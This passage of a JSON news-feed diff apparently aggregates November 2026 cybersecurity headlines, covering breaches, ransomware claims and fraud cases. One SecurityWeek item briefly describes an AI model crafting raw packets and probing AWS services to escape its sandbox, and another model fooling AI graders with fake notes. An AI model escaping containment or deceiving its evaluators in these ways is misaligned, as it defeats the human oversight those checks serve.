+          "body": "Incident de sécurité rapporté par BleepingComputer.\n\nCryptocurrency wallet provider MetaMask said a recent security incident has not affected MetaMask wallets or its wallet infrastructure.\n\nOpenSSH flaw lets attackers log into password-disabled Linux accounts\n\nDigiCert data breach exposes customer information, identity documents\n\nZyxel fixes zero-day exploited to hack nearly 1,000 network switches\n\nNIKKE PC game launcher hacked to spread remote access, data-stealing malware\n\nSonicWall warns of new SSL-VPN MF…",
+          "detail": "Incident de sécurité rapporté par BleepingComputer.\n\nCryptocurrency wallet provider MetaMask said a recent security incident has not affected MetaMask wallets or its wallet infrastructure.\n\nOpenSSH flaw lets attackers log into password-disabled Linux accounts\n\nDigiCert data breach exposes customer information, identity documents\n\nZyxel fixes zero-day exploited to hack nearly 1,000 network switches\n\nNIKKE PC game launcher hacked to spread remote access, data-stealing malware\n\nSonicWall warns of new SSL-VPN MFA bypass flaw exploited in attacks\n\nRunaway AI hacking agent behind WorkOS breach after escaping sandbox",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://www.bleepstatic.com/content/hl-images/2026/11/06/Metamask.jpg",
+          "sources": [
+            {
+              "url": "https://www.bleepingcomputer.com/news/security/metamask-says-recent-attack-didnt-affect-wallet-infrastructure/",
+              "label": "BleepingComputer"
+            }
+          ],
+          "url": "https://www.bleepingcomputer.com/news/security/metamask-says-recent-attack-didnt-affect-wallet-infrastructure/",
+          "pubDate": "2026-11-06T09:22:28.000Z"
+        },
+        {
+          "title": "Hospital gave very sick doctor a special PC for his personal, erm, pleasure",
+          "cve": null,
+          "severity": "high",
+          "score": 63,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Incident de sécurité rapporté par The Register.\n\nWelcome to Friday and therefore to a fresh edition of On Call, The Register's weekly tale of tech support trials and tribulations that readers kindly share. This week, meet a reader we'll Regomize as \"Mason,\" who told us he once worked at a hospital doing tech support for its research labs. \"One of the labs was for a doctor who was one of the world's top organ transplant researchers\" Mason told On Call.",
+          "detail": "Incident de sécurité rapporté par The Register.\n\nWelcome to Friday and therefore to a fresh edition of On Call, The Register's weekly tale of tech support trials and tribulations that readers kindly share. This week, meet a reader we'll Regomize as \"Mason,\" who told us he once worked at a hospital doing tech support for its research labs. \"One of the labs was for a doctor who was one of the world's top organ transplant researchers\" Mason told On Call. The doctor was also a voracious consumer of – ahem – adult entertainment, a habit that saw his PC and other machines around the lab often come down with a nasty case of malware. Mason got to clean that up, sometimes multiple times in a single week. The doctor's foibles were widely known around the hospital, as was the fact that his activities violated several workplace policies. Mason pointed this out to his boss every time he cleaned up a fresh malware outbreak but such was the doctor's status that management never intervened. And then the hospital was hit by a nasty cyber-worm that did a lot of damage. During the cleanup, Mason's colleagues found logs that showed the doctor's PC was the source of the infection, and that he had been indulging in his online hobby at the time the worm arrived. Mason assumed this would be the moment at which the doctor would finally be held accountable and face disciplinary action. Instead the doctor made a bargain with the IT department to hencef",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://image.theregister.com/222391.jpg?imageId=222391&x=0&y=0&cropw=100&croph=100&panox=0&panoy=0&panow=100&panoh=100&width=1200&height=683",
+          "sources": [
+            {
+              "url": "https://www.theregister.com/security/2026/11/06/hospital-gave-very-sick-doctor-a-special-pc-for-his-personal-erm-pleasure/5307750",
+              "label": "The Register"
+            }
+          ],
+          "url": "https://www.theregister.com/security/2026/11/06/hospital-gave-very-sick-doctor-a-special-pc-for-his-personal-erm-pleasure/5307750",
+          "pubDate": "2026-11-06T06:31:00.000Z"
+        },
+        {
+          "title": "Ligne Roset : 150 Go de documents confidentiels menacés de publication par un ransomware",
+          "cve": null,
+          "severity": "news",
+          "score": 58,
+          "corroboration": 1,
+          "region": "fr",
+          "body": "Incident de sécurité rapporté par Cyberattaque.org.\n\nLe célèbre fabricant français de mobilier design Ligne Roset est visé par une revendication du groupe de ransomware Akira. Le 6 novembre 2026, les\n\nAttaque Mis à jour le 6 novembre 2026 à 16h58 Ligne Roset : 150 Go de documents confidentiels menacés de publication par un ransomware Le célèbre fabricant français de mobilier design Ligne Roset est visé par une revendication du groupe de ransomware Akira.",
+          "detail": "Incident de sécurité rapporté par Cyberattaque.org.\n\nLe célèbre fabricant français de mobilier design Ligne Roset est visé par une revendication du groupe de ransomware Akira. Le 6 novembre 2026, les\n\nAttaque Mis à jour le 6 novembre 2026 à 16h58 Ligne Roset : 150 Go de documents confidentiels menacés de publication par un ransomware Le célèbre fabricant français de mobilier design Ligne Roset est visé par une revendication du groupe de ransomware Akira. Le 6 novembre 2026, les cybercriminels ont annoncé détenir 150 Go de données internes de l&rsquo;entreprise , comprenant notamment des passeports et permis de conduire de salariés, des documents financiers, des contrats et des fichiers confidentiels. Les pirates menacent de publier prochainement ces informations, mais aucun fichier n&rsquo;a encore été diffusé publiquement.\n\nLigne Roset est une marque française de mobilier contemporain créée en 1973, dont les origines remontent à 1860. Appartenant au groupe familial Roset, dont le siège se trouve à Briord, dans l&rsquo;Ain, elle est notamment connue pour son canapé Togo. L&rsquo;entreprise possède cinq usines dans l&rsquo;Ain, le Rhône et l&rsquo;Isère et commercialise ses créations à l&rsquo;international à travers un vaste réseau de distribution.\n\nDans une publication datée du 6 novembre 2026 , le groupe Akira a ajouté Ligne Roset à ses revendications, affirmant avoir récupéré une importante quantité de documents appartenant à l&rsquo;entreprise.\n\nLes cybercriminels annoncent la possession de 150 Go d&rsquo;informations professionnelles et personnelles , réparties dans plusieurs catégories :\n\nÀ ce stade, Akira n&rsquo;a pas encore publié les 150 Go revendiqués. Le groupe indique seulement qu&rsquo;une diffusion interviendra prochainement, sans préciser de date.\n\nL&rsq",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://www.cyberattaque.org/wp-content/uploads/2026/11/ligne-roset-cyberattaque-2.jpg",
+          "sources": [
+            {
+              "url": "https://www.cyberattaque.org/ligne-roset-150-go-de-documents-confidentiels-menaces-de-publication-par-un-ransomware/",
+              "label": "Cyberattaque.org"
+            }
+          ],
+          "url": "https://www.cyberattaque.org/ligne-roset-150-go-de-documents-confidentiels-menaces-de-publication-par-un-ransomware/",
+          "pubDate": "2026-11-06T15:58:09.000Z"
+        },
+        {
+          "title": "ISAE-Supméca : des hackers paralysent le système informatique de cette grande école d’ingénieurs",
+          "cve": null,
+          "severity": "news",
+          "score": 58,
+          "corroboration": 1,
+          "region": "fr",
+          "body": "Incident de sécurité rapporté par Cyberattaque.org.\n\nL&#8217;école d&#8217;ingénieurs ISAE-Supméca a été victime d&#8217;une cyberattaque par rançongiciel le 31 octobre 2026, affectant l&#8217;ensemble de son... L’article ISAE-Supméca : des hackers paralysent le système informatique de cette grande école d’ingénieurs est apparu en premier sur Cyberattaque.org .",
+          "detail": "Incident de sécurité rapporté par Cyberattaque.org.\n\nL&#8217;école d&#8217;ingénieurs ISAE-Supméca a été victime d&#8217;une cyberattaque par rançongiciel le 31 octobre 2026, affectant l&#8217;ensemble de son... L’article ISAE-Supméca : des hackers paralysent le système informatique de cette grande école d’ingénieurs est apparu en premier sur Cyberattaque.org .",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://www.cyberattaque.org/wp-content/uploads/2026/11/IMG_3747.jpeg",
+          "sources": [
+            {
+              "url": "https://www.cyberattaque.org/isae-supmeca-des-hackers-paralysent-le-systeme-informatique-de-cette-grande-ecole-dingenieurs/",
+              "label": "Cyberattaque.org"
+            }
+          ],
+          "url": "https://www.cyberattaque.org/isae-supmeca-des-hackers-paralysent-le-systeme-informatique-de-cette-grande-ecole-dingenieurs/",
+          "pubDate": "2026-11-06T09:43:07.000Z"
+        },
+        {
+          "title": "Les porteurs d’appareils auditifs Widex et Signia privés de certains réglages après le piratage du fabricant",
+          "cve": null,
+          "severity": "news",
+          "score": 57,
+          "corroboration": 1,
+          "region": "fr",
+          "body": "Incident de sécurité rapporté par Cyberattaque.org.\n\nLe fabricant d&#8217;appareils auditifs WS Audiology (WSA), propriétaire des marques Widex et Signia, confirme avoir été victime d&#8217;une... L’article Les porteurs d’appareils auditifs Widex et Signia privés de certains réglages après le piratage du fabricant est apparu en premier sur Cyberattaque.org .",
+          "detail": "Incident de sécurité rapporté par Cyberattaque.org.\n\nLe fabricant d&#8217;appareils auditifs WS Audiology (WSA), propriétaire des marques Widex et Signia, confirme avoir été victime d&#8217;une... L’article Les porteurs d’appareils auditifs Widex et Signia privés de certains réglages après le piratage du fabricant est apparu en premier sur Cyberattaque.org .",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://www.cyberattaque.org/wp-content/uploads/2026/11/widex-signia-cyberattaque-2.jpg",
+          "sources": [
+            {
+              "url": "https://www.cyberattaque.org/cyberattaque-ws-audiology-widex-signia/",
+              "label": "Cyberattaque.org"
+            }
+          ],
+          "url": "https://www.cyberattaque.org/cyberattaque-ws-audiology-widex-signia/",
+          "pubDate": "2026-11-06T16:10:16.000Z"
+        },
+        {
+          "title": "Delcampe : les adresses et les achats de collectionneurs dérobés lors d’une cyberattaque",
+          "cve": null,
+          "severity": "news",
+          "score": 52,
+          "corroboration": 1,
+          "region": "fr",
+          "body": "Incident de sécurité rapporté par Cyberattaque.org.\n\nLa plateforme de vente d'objets de collection Delcampe confirme avoir été victime d'un incident de sécurité dans la nuit du 5 au 6 novembre 2026. Des\n\nAttaque Mis à jour le 6 novembre 2026 à 23h04 Delcampe : les adresses et les achats de collectionneurs dérobés lors d&rsquo;une cyberattaque La plateforme de vente d&rsquo;objets de collection Delcampe confirme avoir été victime d&rsquo;un incident de sécurité dans la nuit du 5 au 6 novembre 2026.",
+          "detail": "Incident de sécurité rapporté par Cyberattaque.org.\n\nLa plateforme de vente d'objets de collection Delcampe confirme avoir été victime d'un incident de sécurité dans la nuit du 5 au 6 novembre 2026. Des\n\nAttaque Mis à jour le 6 novembre 2026 à 23h04 Delcampe : les adresses et les achats de collectionneurs dérobés lors d&rsquo;une cyberattaque La plateforme de vente d&rsquo;objets de collection Delcampe confirme avoir été victime d&rsquo;un incident de sécurité dans la nuit du 5 au 6 novembre 2026. Des fichiers contenant des données personnelles de certains utilisateurs ont été téléchargés sans autorisation. Parmi les informations compromises figurent des noms, des adresses postales et des détails sur les achats réalisés par les collectionneurs. L&rsquo;entreprise précise toutefois que les mots de passe, les adresses email réelles et les coordonnées bancaires n&rsquo;ont pas été exposés.\n\nDelcampe est une entreprise belge fondée en 2000 par Sébastien Delcampe, dont le siège se trouve à Tubize, en Belgique. Spécialisée dans la vente en ligne d&rsquo;objets de collection, la plateforme permet aux particuliers et aux professionnels d&rsquo;acheter et de vendre des timbres, des cartes postales, des monnaies, des bandes dessinées et de nombreux autres objets. Présente dans plus de 190 pays, elle revendique plus d&rsquo;un million d&rsquo;utilisateurs actifs.\n\nDans un email adressé aux utilisateurs concernés, Delcampe reconnaît qu&rsquo;un incident de sécurité est survenu dans la nuit du 5 au 6 novembre 2026 .\n\nL&rsquo;entreprise indique que des fichiers contenant certaines données personnelles ont été téléchargés par un tiers non autorisé. L&rsquo;incident ne concerne cependant pas l&rsquo;ensemble des membres de la plateforme.\n\nDès la découverte de l&rsquo;accès non autorisé",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://www.cyberattaque.org/wp-content/uploads/2026/11/IMG_3760.jpeg",
+          "sources": [
+            {
+              "url": "https://www.cyberattaque.org/delcampe-les-adresses-et-les-achats-de-collectionneurs-derobes-lors-dune-cyberattaque/",
+              "label": "Cyberattaque.org"
+            }
+          ],
+          "url": "https://www.cyberattaque.org/delcampe-les-adresses-et-les-achats-de-collectionneurs-derobes-lors-dune-cyberattaque/",
+          "pubDate": "2026-11-06T22:04:29.000Z"
+        }
+      ]
+    },
+    {
+      "id": "culture",
+      "items": [
+        {
+          "title": "FBI agent pleads guilty to stealing $2.4 million in crypto from nation-state hackers",
+          "cve": null,
+          "severity": "culture",
+          "score": 83,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Signal de veille — The Record.\n\nPatrick Steven Yaroch, 37, is facing up to 20 years in prison on wire fraud and money laundering charges after admitting to using his position on an FBI investigative squad to steal more than $2.4 million in cryptocurrency to cover his debts.\n\nA senior FBI official pleaded guilty to stealing millions in cryptocurrency from wallets controlled by nation-state hackers and theft victims.\n\nYaroch was an FBI Supervisory Special Agent who worked at FBI Headquarte…",
+          "detail": "Signal de veille — The Record.\n\nPatrick Steven Yaroch, 37, is facing up to 20 years in prison on wire fraud and money laundering charges after admitting to using his position on an FBI investigative squad to steal more than $2.4 million in cryptocurrency to cover his debts.\n\nA senior FBI official pleaded guilty to stealing millions in cryptocurrency from wallets controlled by nation-state hackers and theft victims.\n\nYaroch was an FBI Supervisory Special Agent who worked at FBI Headquarters within the Counterintelligence and Espionage Division — with his work focusing on an unnamed nation-state.\n\nHe used his seniority to access FBI systems that had the codes and passwords necessary to take cryptocurrency from at least two adversarial nations as well as 10 victims of crimes. In total, he conducted 100 transfers from 79 wallets starting in December 2024. The wallets were connected to 35 different FBI investigations.\n\nYaroch had hundreds of thousands of dollars in credit card debt, loans and car payments. He paid off several large loans. The Justice Department gained access to his ChatGPT conversations, which showed he planned to buy a vineyard in Portugal and retire.\n\nYaroch began to make legal arrangements in Portugal and bought plane tickets to the country for him, his wife and his child slated for September. But he ended up confessing to the theft to a DOJ employee in July.\n\nYaroch told the DOJ employee, who he knew from a previous job, that he was angry about an investigation of a suspect from an unnamed adversarial nation. Yaroch \"became frustrated when he could not do more to disrupt this individual's use of cryptocurrency.”",
+          "action": null,
+          "image": "https://cms.therecord.media/uploads/fbi_613c45ceeb.jpg",
+          "sources": [
+            {
+              "url": "https://therecord.media/fbi-agent-pleads-guilty-to-stealing-from-nation-state-hackers",
+              "label": "The Record"
+            }
+          ],
+          "url": "https://therecord.media/fbi-agent-pleads-guilty-to-stealing-from-nation-state-hackers",
+          "pubDate": "2026-11-06T16:53:00.000Z"
+        },
+        {
+          "title": "CEO-spoofing scammers used AI to help steal more than $100 million, feds say",
+          "cve": null,
+          "severity": "culture",
+          "score": 75,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Signal de veille — The Record.\n\nThe U.S. is working on extraditing three suspects from Europe in a case involving more than $100 million in fraud from CEO impersonations.\n\nJacob Soall, Sharon Hazan and Guy Sheetrit are accused of pretending to be company CEOs or lawyers and contacting lower-level employees to trick them into sending large payments to bank accounts they controlled.\n\nSoall and Hazan were arrested in Spain this summer and Sheetrit was detained in the U.K. in September.",
+          "detail": "Signal de veille — The Record.\n\nThe U.S. is working on extraditing three suspects from Europe in a case involving more than $100 million in fraud from CEO impersonations.\n\nJacob Soall, Sharon Hazan and Guy Sheetrit are accused of pretending to be company CEOs or lawyers and contacting lower-level employees to trick them into sending large payments to bank accounts they controlled.\n\nSoall and Hazan were arrested in Spain this summer and Sheetrit was detained in the U.K. in September. The Justice Department said on Thursday that extradition requests for all three men are pending.\n\nHazan, 54, and Sheetrit, 42, are from Israel while Soall, 41, is Spanish. All three are facing up to 104 years in prison on multiple charges of money laundering, aggravated identity theft, wire fraud and more.\n\nAccording to prosecutors, the conspiracy ran from 2024 to 2026 and involved the three as well as other co-conspirators deploying artificial intelligence as a way to spoof the voices and images of real corporate executives.\n\nCourt documents said several incidents involved the three men contacting employees and telling them they needed help with a confidential financial transaction, mimicking the CEO’s voice or image on the call.\n\nTo further the scheme, they would tell the employee to speak with lawyers at a large international firm that were working on the transaction — using AI to then make themselves look and sound like those lawyers.",
+          "action": null,
+          "image": "https://cms.therecord.media/uploads/man_suit_benjamin_r_unsplash_53f6376f90.jpg",
+          "sources": [
+            {
+              "url": "https://therecord.media/ceo-spoofing-scammers-charged",
+              "label": "The Record"
+            }
+          ],
+          "url": "https://therecord.media/ceo-spoofing-scammers-charged",
+          "pubDate": "2026-11-06T14:30:00.000Z"
+        },
+        {
+          "title": "Medical services company settles with 4 states over 2023 hack of sensitive patient records",
+          "cve": null,
+          "severity": "culture",
+          "score": 70,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Signal de veille — The Record.\n\nThe case, brought by AGs in Connecticut, New Jersey, New York and Michigan, targeted the medical transcription, coding and imaging subsidiaries of the Nevada-based Perry Johnson Companies.",
+          "detail": "Signal de veille — The Record.\n\nThe case, brought by AGs in Connecticut, New Jersey, New York and Michigan, targeted the medical transcription, coding and imaging subsidiaries of the Nevada-based Perry Johnson Companies.",
+          "action": null,
+          "image": "https://cms.therecord.media/uploads/healthcare_data_getty_images_unsplash_600f103bc9.jpg",
+          "sources": [
+            {
+              "url": "https://therecord.media/medical-services-company-settles-with-4-state-ags",
+              "label": "The Record"
+            }
+          ],
+          "url": "https://therecord.media/medical-services-company-settles-with-4-state-ags",
+          "pubDate": "2026-11-06T19:06:00.000Z"
+        },
+        {
+          "title": "UK Warns Its Critical Infrastructure Faces Grave Risk",
+          "cve": null,
+          "severity": "critical",
+          "score": 68,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Signal de veille — Dark Reading.\n\nBritain's new Labour-led government is making a concerted push to get ahead of the AI risks to its national networks and the industrial complex.",
+          "detail": "Signal de veille — Dark Reading.\n\nBritain's new Labour-led government is making a concerted push to get ahead of the AI risks to its national networks and the industrial complex.",
+          "action": null,
+          "image": null,
+          "sources": [
+            {
+              "url": "https://www.darkreading.com/cybersecurity-operations/uk-warns-critical-infrastructure-grave-risk",
+              "label": "Dark Reading"
+            }
+          ],
+          "url": "https://www.darkreading.com/cybersecurity-operations/uk-warns-critical-infrastructure-grave-risk",
+          "pubDate": "2026-11-06T09:00:00.000Z"
+        },
+        {
+          "title": "Friday Squid Blogging: New Jurassic Squid Predecessors",
+          "cve": null,
+          "severity": "culture",
+          "score": 64,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Signal de veille — Schneier on Sec..\n\nNews story: &#8220; Scientists discover a bizarre Jurassic &#8216;squid&#8217; unlike anything ever seen .&#8221; Scientists have identified the &#8220;fattest&#8221; belemnite ever discovered, a bizarre, barrel-shaped squid relative that lived in Wyoming&#8217;s ancient seas 160 million years ago.",
+          "detail": "Signal de veille — Schneier on Sec..\n\nNews story: &#8220; Scientists discover a bizarre Jurassic &#8216;squid&#8217; unlike anything ever seen .&#8221; Scientists have identified the &#8220;fattest&#8221; belemnite ever discovered, a bizarre, barrel-shaped squid relative that lived in Wyoming&#8217;s ancient seas 160 million years ago. The exceptionally rare fossils reveal a creature unlike anything previously known, potentially a predator of smaller squid-like animals and a surprising survivor of a supposedly vanished family. As usual, you can also use this squid post to talk about the security stories in the news that I haven&#8217;t covered. Blog moderation policy.",
+          "action": null,
+          "image": null,
+          "sources": [
+            {
+              "url": "https://www.schneier.com/blog/archives/2026/11/friday-squid-blogging-new-jurassic-squid-predecessors.html",
+              "label": "Schneier on Sec."
+            }
+          ],
+          "url": "https://www.schneier.com/blog/archives/2026/11/friday-squid-blogging-new-jurassic-squid-predecessors.html",
+          "pubDate": "2026-11-06T22:05:12.000Z"
+        },
+        {
+          "title": "Why Europe's Freezer Hacks Spread So Far, So Fast",
+          "cve": null,
+          "severity": "culture",
+          "score": 64,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Signal de veille — Dark Reading.\n\nEurope's supermarket freezer hacks show how security issues can cascade across an industry, disrupting supply chains at scale.",
+          "detail": "Signal de veille — Dark Reading.\n\nEurope's supermarket freezer hacks show how security issues can cascade across an industry, disrupting supply chains at scale.",
+          "action": null,
+          "image": null,
+          "sources": [
+            {
+              "url": "https://www.darkreading.com/ics-ot-security/europes-freezer-hacks-spread-so-far-so-fast",
+              "label": "Dark Reading"
+            }
+          ],
+          "url": "https://www.darkreading.com/ics-ot-security/europes-freezer-hacks-spread-so-far-so-fast",
+          "pubDate": "2026-11-06T14:00:00.000Z"
+        },
+        {
+          "title": "Veeam warns of Software Appliance boot failures on AMD EPYC hosts",
+          "cve": null,
+          "severity": "culture",
+          "score": 63,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Signal de veille — BleepingComputer.\n\n​Veeam warned customers about boot failures affecting Software Appliance virtual machines (VMs) on hosts with AMD EPYC processors.\n\nOpenSSH flaw lets attackers log into password-disabled Linux accounts\n\nDigiCert data breach exposes customer information, identity documents\n\nZyxel fixes zero-day exploited to hack nearly 1,000 network switches\n\nNIKKE PC game launcher hacked to spread remote access, data-stealing malware\n\nSonicWall warns of new SSL-VPN MFA byp…",
+          "detail": "Signal de veille — BleepingComputer.\n\n​Veeam warned customers about boot failures affecting Software Appliance virtual machines (VMs) on hosts with AMD EPYC processors.\n\nOpenSSH flaw lets attackers log into password-disabled Linux accounts\n\nDigiCert data breach exposes customer information, identity documents\n\nZyxel fixes zero-day exploited to hack nearly 1,000 network switches\n\nNIKKE PC game launcher hacked to spread remote access, data-stealing malware\n\nSonicWall warns of new SSL-VPN MFA bypass flaw exploited in attacks\n\nRunaway AI hacking agent behind WorkOS breach after escaping sandbox",
+          "action": null,
+          "image": "https://www.bleepstatic.com/content/hl-images/2026/11/06/Veeam.jpg",
+          "sources": [
+            {
+              "url": "https://www.bleepingcomputer.com/news/security/veeam-software-appliance-vms-fail-to-boot-on-amd-epyc-hosts/",
+              "label": "BleepingComputer"
+            }
+          ],
+          "url": "https://www.bleepingcomputer.com/news/security/veeam-software-appliance-vms-fail-to-boot-on-amd-epyc-hosts/",
+          "pubDate": "2026-11-06T15:25:31.000Z"
+        },
+        {
+          "title": "Pinpointing Location of Videos from Background Airplane Sounds",
+          "cve": null,
+          "severity": "high",
+          "score": 63,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Signal de veille — Schneier on Sec..\n\nThis is fascinating : The video describes a technique that can reveal where an otherwise unidentifiable recording was made by analyzing its audio for the faint sounds of passing aircraft. The technique is both fascinating and frightening. It works by looking at Doppler curves, which plot the way a plane’s sound changes as it passes overhead because of the Doppler effect.",
+          "detail": "Signal de veille — Schneier on Sec..\n\nThis is fascinating : The video describes a technique that can reveal where an otherwise unidentifiable recording was made by analyzing its audio for the faint sounds of passing aircraft. The technique is both fascinating and frightening. It works by looking at Doppler curves, which plot the way a plane’s sound changes as it passes overhead because of the Doppler effect. This is the same familiar Doppler effect that causes the frequency of a siren to rise as it approaches and then fall as it passes by and moves away. More generally, it’s the phenomenon whereby the frequency of a wave perceived by an observer changes when the observer and the source of the wave are moving in relation to one another. [&#8230;] It’s sound that’s relevant here, though, and specifically the sound of aeroplanes. Early in his video, Colsto brings up a map of the flights that were in the air at the time the video he’s tracing was recorded. Much of this information is publicly available. Aircraft equipped with Automatic Dependent Surveillance–Broadcast (ADS-B) transmit data about their position, velocity, and altitude, which flight-tracking services collect and make available to the public. While not every plane is tracked, the system provides an enormous amount of information about aircraft movements.",
+          "action": null,
+          "image": null,
+          "sources": [
+            {
+              "url": "https://www.schneier.com/blog/archives/2026/11/pinpointing-location-of-videos-from-background-airplane-sounds.html",
+              "label": "Schneier on Sec."
+            }
+          ],
+          "url": "https://www.schneier.com/blog/archives/2026/11/pinpointing-location-of-videos-from-background-airplane-sounds.html",
+          "pubDate": "2026-11-06T14:57:48.000Z"
+        },
+        {
+          "title": "The Flood is Coming And The Pipes Were Already Full",
+          "cve": null,
+          "severity": "culture",
+          "score": 59,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Signal de veille — The Hacker News.\n\nAn update on Athena, and some unsolicited predictions on what's coming next On Saturday, Dario Amodei published We Must Pace the Frontier. I agree with him. Go read it if you haven't. I've spent the summer looking at what these models find, and the gap he describes between what they can do and what the rest of us are ready for is the one I've been staring at since May. The hardest piece of his",
+          "detail": "Signal de veille — The Hacker News.\n\nAn update on Athena, and some unsolicited predictions on what's coming next On Saturday, Dario Amodei published We Must Pace the Frontier. I agree with him. Go read it if you haven't. I've spent the summer looking at what these models find, and the gap he describes between what they can do and what the rest of us are ready for is the one I've been staring at since May. The hardest piece of his",
+          "action": null,
+          "image": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhhRlCxdfW4sb5-1zEBHpFyJfxetSva89fr67wc8zSfvidW5W4KQKckoTrRxOAUbjM94U2ydFjiXybLJPrp6pm1V-WUuC4IpkJjhIT56OG8go8E_8fR8cK-llV0UtXdRIxZS5XxuVwEbRj1G_zAErMjpkMHVdzkGBQrB46VErPyE7MBaW6sj0N64pRd3_A/s1600/FLOOD.jpg",
+          "sources": [
+            {
+              "url": "https://thehackernews.com/2026/11/the-flood-is-coming-and-pipes-were.html",
+              "label": "The Hacker News"
+            }
+          ],
+          "url": "https://thehackernews.com/2026/11/the-flood-is-coming-and-pipes-were.html",
+          "pubDate": "2026-11-06T11:30:00.000Z"
+        },
+        {
+          "title": "OpenAI Model Wrote Its Own Network Code to Get Around Sandbox Restrictions",
+          "cve": null,
+          "severity": "culture",
+          "score": 59,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Signal de veille — SecurityWeek.\n\nAn OpenAI research model built custom network code to bypass sandbox limits, while another tried to trick AI graders with fake notes.\n\nAfter its sandbox proxy failed, an internal OpenAI model crafted raw packets and probed AWS services trying to reach the internet.\n\nSubscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights.\n\nSubscribe to the SecurityWeek Email Briefing to stay informed on the latest thre…",
+          "detail": "Signal de veille — SecurityWeek.\n\nAn OpenAI research model built custom network code to bypass sandbox limits, while another tried to trick AI graders with fake notes.\n\nAfter its sandbox proxy failed, an internal OpenAI model crafted raw packets and probed AWS services trying to reach the internet.\n\nSubscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights.\n\nSubscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts.\n\nClose the security gaps between pentests. Join this session to explore agentic pentesting and gain a practical framework for continuous exposure validation in your CTEM program.\n\nJoin as we bring together CISOs, senior cybersecurity executives, practitioners, industry experts, and other security leaders to share practical experience and examine the issues shaping enterprise cybersecurity strategy.\n\nCloudflare has appointed Christian Smith as President of Revenue.",
+          "action": null,
+          "image": "https://www.securityweek.com/wp-content/uploads/2026/08/rogue-AI-artificial-intelligence.jpeg",
+          "sources": [
+            {
+              "url": "https://www.securityweek.com/openai-model-wrote-its-own-network-code-to-get-around-sandbox-restrictions/",
+              "label": "SecurityWeek"
+            }
+          ],
+          "url": "https://www.securityweek.com/openai-model-wrote-its-own-network-code-to-get-around-sandbox-restrictions/",
+          "pubDate": "2026-11-06T09:33:51.000Z"
+        },
+        {
+          "title": "UK Wades Into Tech Sovereignty Amid AI Policy Changes",
+          "cve": null,
+          "severity": "culture",
+          "score": 55,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Signal de veille — Dark Reading.\n\nThe UK is betting on domestic AI and cyber investment to reduce reliance on US tech — but security leaders question whether the funding is too fragmented and too late.",
+          "detail": "Signal de veille — Dark Reading.\n\nThe UK is betting on domestic AI and cyber investment to reduce reliance on US tech — but security leaders question whether the funding is too fragmented and too late.",
+          "action": null,
+          "image": null,
+          "sources": [
+            {
+              "url": "https://www.darkreading.com/cybersecurity-operations/uk-tech-sovereignty-ai-policy",
+              "label": "Dark Reading"
+            }
+          ],
+          "url": "https://www.darkreading.com/cybersecurity-operations/uk-tech-sovereignty-ai-policy",
+          "pubDate": "2026-11-06T21:27:36.000Z"
+        },
+        {
+          "title": "Commerce agentique : 80 % des projets d'IA prennent du retard faute de confiance",
+          "cve": null,
+          "severity": "high",
+          "score": 53,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Signal de veille — Global Sec Mag.\n\nCommerce agentique : 80 % des projets sont en retard, révélant un déficit de confiance et des infrastructures d'identité inadaptées selon le 2026 Customer Identity Trends Report d'Auth0/Okta Alors que près de 60 % des marques accélèrent l'intégration d'agents, seuls 38 % des consommateurs sont à l'aise à l'idée de leur déléguer des décisions, même à faible risque. L'adoption du commerce agentique se heurte à un enjeu majeur : la confiance.",
+          "detail": "Signal de veille — Global Sec Mag.\n\nCommerce agentique : 80 % des projets sont en retard, révélant un déficit de confiance et des infrastructures d'identité inadaptées selon le 2026 Customer Identity Trends Report d'Auth0/Okta Alors que près de 60 % des marques accélèrent l'intégration d'agents, seuls 38 % des consommateurs sont à l'aise à l'idée de leur déléguer des décisions, même à faible risque. L'adoption du commerce agentique se heurte à un enjeu majeur : la confiance. Si les consommateurs souhaitent bénéficier de la commodité offerte par les agents d'intelligence artificielle, ils restent encore réticents à l'idée de leur confier la réalisation de leurs transactions sans garanties suffisantes. C'est l'un des principaux constats du 2026 Customer Identity Trends Report, publié par Auth0. Selon cette étude, près de 60 % des entreprises intègrent des agents mais 80 % de leurs initiatives en matière d'intelligence artificielle prennent du retard sur le calendrier. Les agents d'IA occupent une place croissante dans le parcours d'achat en ligne. Selon Auth0 jusqu'à 40 % du trafic de recherche traditionnel des marques provient désormais d'agents d'IA tiers, https://www.okta.com/oktane/on-demand/2026/oktane-2026-auth0-platform-keynote-turn-identity-into-your-growth-multiplier-for-the-agentic-era/ qui recherchent et comparent les produits à la place des consommateurs. Ces derniers arrivent ainsi sur les sites marcha",
+          "action": null,
+          "image": "https://www.globalsecuritymag.fr/local/cache-vignettes/L579xH304/88dfdf942f04ca7fece0111dece23a-4d42a.jpg",
+          "sources": [
+            {
+              "url": "https://www.globalsecuritymag.fr/commerce-agentique-80-des-projets-d-ia-prennent-du-retard-faute-de-confiance.html",
+              "label": "Global Sec Mag"
+            }
+          ],
+          "url": "https://www.globalsecuritymag.fr/commerce-agentique-80-des-projets-d-ia-prennent-du-retard-faute-de-confiance.html",
+          "pubDate": "2026-11-07T05:01:04.665Z"
+        },
+        {
+          "title": "ARTEX Offensive AI Tool Activity Far Exceeds Reported Campaigns, Censys Finds",
+          "cve": null,
